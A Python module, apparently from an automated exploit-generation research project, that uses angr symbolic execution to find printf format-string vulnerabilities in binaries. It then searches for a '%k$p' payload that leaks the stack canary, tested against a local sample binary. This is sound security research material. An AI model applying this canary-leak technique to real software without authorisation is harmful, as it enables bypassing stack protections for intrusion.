"""
author : 4everdestiny
create_time : 2022.3.1
description : this is the code to check the format string Vulnerability
in the binary.
input : binary path
output : the payload and the final state of using format string to leak canary
"""

import angr
from fuzz.Fuzzer import Fuzzer
from state.FormatStringStateLog import FormatStringStateLog
from state.FormatStringStateLog import SingleFormatStringStateLog
from log import log

log = log.Log()


class FormatStringExamine:
    def __init__(self, binarypath, function_helper=None):
        self.binarypath = binarypath
        self.function_helper = function_helper
        self.NewProject()
        # self.fuzzer = Fuzzer(self.binarypath, self.project, self.state)
        self.formatstringstatelog = FormatStringStateLog()
        self.BP = []

    def NewProject(self):
        self.project = angr.Project(self.binarypath, auto_load_libs=True)
        if len(self.project.loader.requested_names) == 0:
            self.binary_static = True
        else:
            self.binary_static = False
        self.state = self.project.factory.entry_state()

    def PrintfCond(self, state):
        """
        finish the printf function's condition, if it is a printf function call
        call check of read, and then check the stack overflow vulnerability.
        :param state: the current state to check
        :return: return True when it is a printf call, False when not
        """
        printf_address = self.function_helper.GetFunctionAddress(func_name="printf")
        if printf_address is None:
            # log.Exception("no printf in this binary, no meaning for this action")
            return False
        # print(obj.plt.keys())
        if state.arch.name == "X86":
            if state.solver.eval(state.regs.eip) == printf_address:
                return True
            else:
                return False
        elif state.arch.name == "AMD64":
            if state.solver.eval(state.regs.rip) == printf_address:
                return True
            else:
                return False
        return False

    def RemoveBreakpoints(self, state=None):
        """
        we need to remove all the breakpoints for next running in stack overflow check
        :param state: the state needed to remove breakpoints
        :return: None
        """
        if state is None:
            log.Exception("parameter state error")
            return False
        for BP in self.BP:
            event_type = BP[0]
            bp = BP[1]
            state.inspect.remove_breakpoint(event_type=event_type, bp=bp)

    def FormatStringCheck(self, state):
        """
        check the printf func to judge whether there is a format string Vulnerability
        check stack/heap format string?(finished)
        :param state: the angr state
        :return: print the info, and none return
        True when have fmt, False when not
        """
        if state.arch.name == "AMD64":
            log.info("call_addr:" + hex(state.solver.eval(state.mem[state.regs.rsp].int64_t.resolved) - 5))
            log.info("fmt_rdi_symbolic:" + str(state.regs.rdi.symbolic))
            if state.regs.rdi.symbolic == True:
                log.info("printf function rdi is symbolic")
                log.Exception("format string rdi is symbolic")
                return False
            else:
                rdi = state.solver.eval(state.regs.rdi)
                max_length = 0
                single_size = 4
                for length in range(0, 0x100, single_size):
                    format_string = state.memory.load(rdi + length, single_size)
                    if format_string.symbolic:
                        max_length += single_size
                    else:
                        break
                if max_length >= 1:
                    log.success("find a symbolic format string")
                    log.success("call_addr:" + hex(state.solver.eval(state.mem[state.regs.rsp].int64_t.resolved) - 5))
                    log.success("max format string length:" + hex(max_length))
                    copystate = state.copy()
                    self.RemoveBreakpoints(state=copystate)
                    statelog = SingleFormatStringStateLog(
                        state=copystate, formatstringlength=max_length, project=self.project
                    )
                    self.formatstringstatelog.insert(statelog=statelog)
                    # canary_leak_can = self.UseFmtLeakCanary(state)
                    return True
                else:
                    log.info("this printf function's format string is stable")
                    log.info("not useful for format string Vulnerability")
                    return False
        elif state.arch.name == "X86":
            log.info("call_addr:" + hex(state.solver.eval(state.mem[state.regs.esp].int.resolved) - 5))
            par1 = state.mem[state.regs.esp + 4].int.resolved
            log.info("fmt_par1_symbolic:" + str(par1.symbolic))
            if par1.symbolic == True:
                log.info("printf function's parameter1 is symbolic")
                log.Exception("format string is symbolic")
                return False
            else:
                par1 = state.solver.eval(par1)
                max_length = 0
                single_size = 4
                for length in range(0, 0x100, single_size):
                    format_string = state.memory.load(par1 + length, single_size)
                    if format_string.symbolic:
                        max_length += single_size
                    else:
                        break
                if max_length >= 1:
                    log.success("find a symbolic format string")
                    log.success("call_addr:" + hex(state.solver.eval(state.mem[state.regs.esp].int.resolved) - 5))
                    log.success("maybe max format string length:" + hex(max_length))
                    copystate = state.copy()
                    self.RemoveBreakpoints(state=copystate)
                    statelog = SingleFormatStringStateLog(
                        state=copystate, formatstringlength=max_length, project=self.project
                    )
                    self.formatstringstatelog.insert(statelog=statelog)
                    # canary_leak_can = self.UseFmtLeakCanary(state)
                    return True
                else:
                    log.info("this printf function's format string is stable")
                    log.info("not useful for format string Vulnerability")
                    return False

    def CanaryStopFunc(self, simgr):
        print(simgr.stashes)
        if len(simgr.stashes["canary_leak"]) == 0:
            log.Exception("deadended in canary leak method, please check it")
            exit(0)
        else:
            state = simgr.stashes["canary_leak"][0]
            rip = state.solver.eval(state.regs.rip)
            if rip == self.untilrip:
                return True
            else:
                return False
        return False

    def UseFmtLeakCanary(self, state):
        """
        Use format string Vulnerability to leak canary
        first use for printf format string
        :param state: the current state(angr)
        :return: return find the offset of canary and the payload
        """
        copystate = state.copy()
        fs = copystate.solver.eval(copystate.regs.fs)
        original_canary = copystate.mem[fs + 0x28].uint64_t.resolved
        if original_canary.symbolic:
            log.Exception("canary is symbolic, check this error")
        else:
            original_canary = copystate.solver.eval(original_canary)
        log.info("original canary:" + hex(original_canary))
        return_address = state.solver.eval(state.mem[state.regs.rsp].int.resolved)
        self.untilrip = return_address
        log.info("return address:" + hex(self.untilrip))
        for i in range(1, 0x30):
            print(i)
            copystate = state.copy()
            rdi = copystate.solver.eval(copystate.regs.rdi)
            payload = "%{k}$p\x00".format(k=i)
            constrained_parameter_address = rdi
            constrained_parameter_size_bytes = len(payload)
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = payload
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            copystate.add_constraints(constraint_expression)
            if copystate.satisfiable():
                # there are some format string Vulnerabilities
                # copystate.add_constraints(constraint_expression)
                copysimgr = self.project.factory.simgr(copystate)
                copysimgr.stashes["canary_leak"] = [copystate]
                start_index = len(copystate.posix.dumps(1))
                res = copysimgr.run(stash="canary_leak", until=self.CanaryStopFunc)
                resstate = copysimgr.stashes["canary_leak"][0]
                # print(copysimgr.stashes)
                rip = copystate.solver.eval(copystate.regs.rip)
                # print(hex(rip))
                # print(resstate.posix.dumps(0))
                # print(resstate.posix.dumps(1))
                # print(resstate.posix.dumps(2))
                stdoutput = resstate.posix.dumps(1)[start_index:].decode()
                if hex(original_canary) in stdoutput:
                    return state, payload, start_index
            #break
        return None, "", start_index

    def InitCheckFmtBreakpoints(self):
        BP = self.state.inspect.b("call", when=angr.BP_BEFORE, condition=self.PrintfCond, action=self.FormatStringCheck)
        self.BP.append(["call", BP])

    def FormatStringMain(self, stepcount=0x1000):
        self.InitCheckFmtBreakpoints()
        fuzzer = Fuzzer(self.binarypath, self.project, self.state)
        fuzzer.run(stepcount=stepcount)


if __name__ == '__main__':
    binarypath = "../binaries/formatstring_stackoverflow/fmt_stack_canary/fmt_stack_canary"
    FormatStringExamine = FormatStringExamine(binarypath)
    FormatStringExamine.FormatStringMain()